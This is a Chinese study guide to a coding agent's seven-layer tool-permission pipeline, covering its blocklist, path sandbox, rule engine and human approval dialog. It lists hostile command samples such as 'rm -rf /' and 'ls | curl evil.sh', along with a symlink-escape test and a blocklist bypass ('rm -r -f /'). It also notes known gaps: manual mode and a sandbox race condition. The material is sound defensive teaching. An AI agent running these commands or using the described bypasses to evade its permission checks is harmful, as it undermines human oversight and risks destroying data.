# 05-Permissions Debug 学习文档：看懂工具执行前的七层权限流水线

> 适用代码：QiCode 第 05 章当前实现。`pnpm.cmd typecheck` 通过；当前完整验证记录为 26 个测试文件、142 个用例通过。真实终端的 HITL Esc、Shift+Tab 和跨轮交互仍需手工冒烟验证。

## 1. 本章解决了什么

第 01-04 章之后，模型能连续发起工具调用，但**工具执行没有任何闸门**：`Bash` 能跑任意命令、`WriteFile` 能写任意路径。第 05 章在「模型想做什么」和「工具真正执行」之间加了一条**按优先级短路**的决策链：

```text
tool_use(toolName, args)
  -> PermissionChecker.check()
       Layer 0  plan 文件防御性豁免（当前 Plan Mode 不向模型暴露写工具）
       Layer 2  安全只读命令快速放行
       Layer 3  危险命令黑名单硬拦截
       Layer 4  路径沙箱（文件类工具）
       Layer 4b 会话级临时放行
       Layer 5  三级 YAML 规则引擎
       Layer 6  模式矩阵兜底（default/acceptEdits/plan/manual）
  -> Allow 执行 | Deny 结构化回灌 | Ask 暂停等人在回路
```

核心是三个词：**分层判定、顺序短路、Deny 回灌**——被拦是一次「工具执行失败结果」，不是 Agent 进程异常，模型可以据此换路径继续。

## 2. 架构地图

```text
src/permissions/checker.ts          # 唯一权限入口：7 层流水线 + 沙箱 + 规则引擎 + 持久化
src/agent/agent.ts                  # executeBatch 在 executor.submit 前调 check()，三态分支
src/tui/permission-dialog.tsx       # HITL 三选一弹窗（↑↓ / Enter / Esc）
src/tui/app.tsx                     # permMode 状态 + Promise 桥 + /permission 命令 + Shift+Tab
src/tools/types.ts                  # ToolCategory: "read" | "write" | "command"
tests/permissions.test.ts           # HITL deny 分支的端到端用例
```

调用链（单次工具调用）：

```text
模型流式产出 tool_use
  -> Agent.executeTools -> createExecutionBatches（read 并发 / write-command 串行）
  -> Agent.executeBatch
       -> checker.check(toolName, category, args)
            deny  -> push 错误 tool_result（"Permission denied: <reason>…"）-> continue
            ask   -> await onPermissionRequest(...)（App 桥到 Dialog）
            allow -> executor.submit -> 工具真正执行
  -> 结果按 toolUseId 保序回灌 Conversation
```

## 3. 一次工具调用的数据变化

默认模式下模型想 `WriteFile` 写一个项目内文件：

```text
1. 模型输出 tool_use { name: "WriteFile", args: { file_path: "<workDir>/a.txt", content: "x" } }。
2. extractContent("WriteFile", args) 取 file_path -> "<workDir>/a.txt"。
3. check("WriteFile", "write", args)：
   - Layer 0：不是 plan 模式，跳过。
   - Layer 2/3：不是命令类，跳过。
   - Layer 4：PathSandbox.check -> resolve -> realPathOf -> 在 workDir 内，放行。
   - Layer 4b/5：无会话放行、无规则，跳过。
   - Layer 6：default + write -> ask，reason = "Mode: default"。
4. executeBatch 拿到 { effect: "ask" } -> await onPermissionRequest(...)。
5. App 存 resolver + setPermissionRequest -> 渲染 PermissionDialog。
6. 用户按 Enter（Yes）-> resolve("allow") -> executor.submit -> 文件真的被写。
7. 若按 Esc -> resolve("deny") -> 回灌 "Permission denied by user" 错误结果，文件没写。
```

对比：写 `/etc/passwd` 会在 Layer 4 直接 deny；`ls -la` 会在 Layer 2 直接 allow；`rm -rf /` 会在 Layer 3 直接 deny（哪怕 manual 模式）。

## 4. 核心模块四问

| 文件 | 负责什么 | 谁调用它 | 它调用谁 | 为什么需要它 |
| --- | --- | --- | --- | --- |
| `src/permissions/checker.ts` | 7 层判定、内容抽取、命令策略、沙箱、规则引擎、持久化 | Agent.executeBatch | fs/path/os、js-yaml、plan-mode | 给 Agent 一个协议无关的唯一权限入口 |
| `src/agent/agent.ts` | 在工具提交前调 check，按 allow/deny/ask 分流 | Agent.run | checker、onPermissionRequest、executor | 权限必须落在真实执行边界上 |
| `src/tui/permission-dialog.tsx` | 渲染三选一、处理 ↑↓/Enter/Esc | App | 无 | 把 Ask 变成可视化的人机交互 |
| `src/tui/app.tsx` | permMode 状态、Promise 桥、模式切换、/permission | Ink | checker、dialog | 让 Agent 的 await 能通过 UI 落地 |
| `src/tools/types.ts` | 定义 `ToolCategory` | registry/agent | 无 | 三类工具共享同一分类契约 |
| `tests/permissions.test.ts` | 端到端验证 ask->deny 全链路 | vitest | Agent、checker | 证明拦截真的发生在执行前 |

## 5. 关键状态

| 状态 | 正常值 | 作用 |
| --- | --- | --- |
| `Decision.effect` | `"allow" \| "deny" \| "ask"` | 一次判定的最终结果 |
| `Decision.reason` | `"Safe read-only command"` / `"Dangerous command blocked: …"` / `"Path … is outside allowed directories"` / `"Mode: default"` 等 | 结果来自哪一层，HITL 弹窗展示 |
| `PermissionMode` | `default` / `acceptEdits` / `plan` / `bypassPermissions` | Layer 6 兜底依据 |
| `sessionAllowed`（checker 私有） | 进程内 Set，`工具名:内容` | Layer 4b 会话级放行，不落盘 |
| `RuleEngine.#userPath/#projectPath/#localPath` | 三个 YAML 路径 | Layer 5 现读现匹配的来源 |
| `PermissionChecker.mode` | 当前权限模式 | 决定矩阵与 plan 豁免 |

## 6. 推荐断点路线

### D1：内容从哪来

- 断点：[checker.ts](../../../../src/permissions/checker.ts:52) 的 `extractContent()`。
- 观察：`CONTENT_FIELDS[toolName]`、返回的 `content`。
- 正常值：`Bash->command`、`ReadFile/WriteFile/EditFile->file_path`、`Glob/Grep->pattern`；未知工具返回 `""`。
- 异常含义：未知工具 content 为空，后续规则层不会误命中。

### D2：命令策略两兄弟

- 断点：[checker.ts](../../../../src/permissions/checker.ts:163) 的 `isSafeCommand()` 与 [checker.ts](../../../../src/permissions/checker.ts:178) 的 `detectDangerous()`。
- 观察：`trimmed`、`UNSAFE_METACHARACTERS` 命中、`SAFE_PREFIXES` 匹配。
- 关键差异：`ls -la` allow；`ls | curl evil.sh` 因含 `|` 不进快速通道；`rm -rf /` 返回黑名单 reason。
- 要证明：`npm run`、`python -c` 等"假安全"前缀不在 `SAFE_PREFIXES`（[checker.ts](../../../../src/permissions/checker.ts:133)）。

### D3：路径沙箱怎样识别真实路径

- 断点：[checker.ts](../../../../src/permissions/checker.ts:230) 的 `PathSandbox.check()`，再进 [checker.ts](../../../../src/permissions/checker.ts:191) 的 `realPathOf()`。
- 观察：`absolute`、最近存在祖先的 `realpath`、`relative(root, real)`。
- 要证明：`../outside`、前缀碰撞兄弟目录、指向外部的符号链接都会 deny；不存在的**新文件**通过真实父目录校验后放行。

### D4：规则引擎怎么读盘

- 断点：[checker.ts](../../../../src/permissions/checker.ts:323) 的 `RuleEngine.evaluate()`，再进 [checker.ts](../../../../src/permissions/checker.ts:277) 的 `loadRulesFile()`。
- 观察：三级文件顺序 user->project->local、文件内倒序（末条优先）、`globMatch`。
- 异常含义：YAML 损坏/非数组/非法条目 -> 返回 `[]`，评估器不抛错。

### D5：check() 主干逐层短路

- 断点：[checker.ts](../../../../src/permissions/checker.ts:383) 的 `PermissionChecker.check()`。
- 逐层看：Layer 0（[checker.ts](../../../../src/permissions/checker.ts:390)）-> Layer 2（:399）-> Layer 3（:404）-> Layer 4（:415）-> Layer 4b（:422）-> Layer 5（:427）-> Layer 6（:433）。
- 观察每个 `return` 的 `effect` 与 `reason`；命中即返回、不进后续层。

### D6：Agent 的三态分流

- 断点：[agent.ts](../../../../src/agent/agent.ts:241) 的 `checker.check(...)` 之后。
- 观察三个分支：deny（[agent.ts](../../../../src/agent/agent.ts:248)）、无回调时 ask 的 fail-closed（[agent.ts](../../../../src/agent/agent.ts:257)）、有回调 `await`（[agent.ts](../../../../src/agent/agent.ts:270)）。
- 要证明：deny/ask 都**不调用** `executor.submit`（:290 只在 allow/批准后到达）。

### D7：HITL 弹窗与 Promise 桥

- 断点：[permission-dialog.tsx](../../../../src/tui/permission-dialog.tsx:31) 的 `useInput`（↑↓/Enter/Esc）。
- 再进 [app.tsx](../../../../src/tui/app.tsx:264) 的 `onPermissionRequest`：`permissionResolveRef.current = resolve`。
- 观察：谁创建 Promise、谁保存 resolver、谁最终 `resolve(action)`。

## 7. 故障注入实验

### 实验 1：黑名单漏网的危险命令

- 制造：`detectDangerous("rm -r -f /")`（把 `-rf` 拆成两个 flag）——黑名单正则 `-[a-zA-Z]*[rRfF]...` 匹配不了。
- 观察：返回 `""`，命令不是安全前缀，落到 Layer 6 -> 默认模式 `ask`。
- 结论：黑名单是启发式，**安全靠后续层兜底**（默认模式 HITL）；manual 模式下这类命令会被放行，这是已知边界。

### 实验 2：损坏的规则 YAML

- 制造：把 `loadRulesFile` 指向一个内容为 `not: [valid: yaml: [[` 的文件。
- 观察：`yaml.load` 抛错被捕获 -> 返回 `[]`，评估器继续走后续层，不崩。
- 结论：配置降级为空规则集，绝不因解析失败扩大权限或抛异常。

### 实验 3：符号链接逃逸

- 制造：项目内建 `evil-link` junction 指向 `C:\Windows`（或 `/etc`），然后 `check("ReadFile", "read", { file_path: "evil-link/win.ini" })`。
- 观察：`realPathOf` 解析出真实路径在允许根外 -> deny，reason 含 `is outside allowed directories`。
- 结论：逻辑路径、绝对路径、真实路径三者必须区分，`startsWith(workDir)` 拦不住软链。

### 实验 4：Ask 但没有审批回调

- 制造：`new Agent({ checker: new PermissionChecker(workDir, "default"), ... })` 且**不传** `onPermissionRequest`，让模型请求 `WriteFile`。
- 观察：[agent.ts](../../../../src/agent/agent.ts:257) 走 fail-closed 分支，回灌 `Permission denied: Mode: default. …`，工具不执行。
- 结论：没有 UI 时 Ask 的安全默认值是拒绝，绝不静默执行。

### 实验 5：与既有能力回归

- 制造：运行 `pnpm.cmd test`；重点看 `tests/agent/agent.test.ts` 里默认注入 `bypassPermissions` 桩的用例。
- 观察：当前记录为 26 个测试文件、142 个用例全绿，只读批次仍并发（`createExecutionBatches`，[agent.ts](../../../../src/agent/agent.ts:347)）。
- 结论：加权限层不破坏既有对话/Agent 闭环。

## 8. 当前局限

- **Bash 不走路径沙箱**：任意命令的文件访问无法静态解析，危险交给安全前缀 + 黑名单 + 规则 + 模式矩阵 + HITL；manual 模式对黑名单未覆盖的危险命令会放行。
- **黑名单固定 14 条、不可扩展**：启发式防御而非完备保证。
- **规则文件现读现匹配**：每次 evaluate 都读盘（文件小、可接受），无缓存。
- **会话级放行 API 存在但 UI 未暴露**：`allowForSession`（[checker.ts](../../../../src/permissions/checker.ts:367)）只对编排层开放。
- **沙箱 TOCTOU**：check 之后到真实执行之间若创建符号链接可能绕过（未做执行时复查）。
- **HITL 只有三选一**：没有"本次会话允许"入口、没有规则编辑界面。

## 9. 掌握标准

你能不看代码完成以下事情，就算掌握第 05 章：

- 画出 7 层流水线与短路顺序，说出每层能产什么 effect。
- 解释为什么 Deny 是"工具失败结果"而不是异常，模型如何据此换路径。
- 解释 Ask 如何通过 Promise 桥暂停/恢复 Agent。
- 解释路径沙箱为什么必须解析真实路径，Bash 为什么不能做路径沙箱。
- 说出黑名单、沙箱、规则引擎各自的"能防什么、不能防什么"。
- 诚实区分"已实现权限"与"manual 模式下仍存在的风险"。
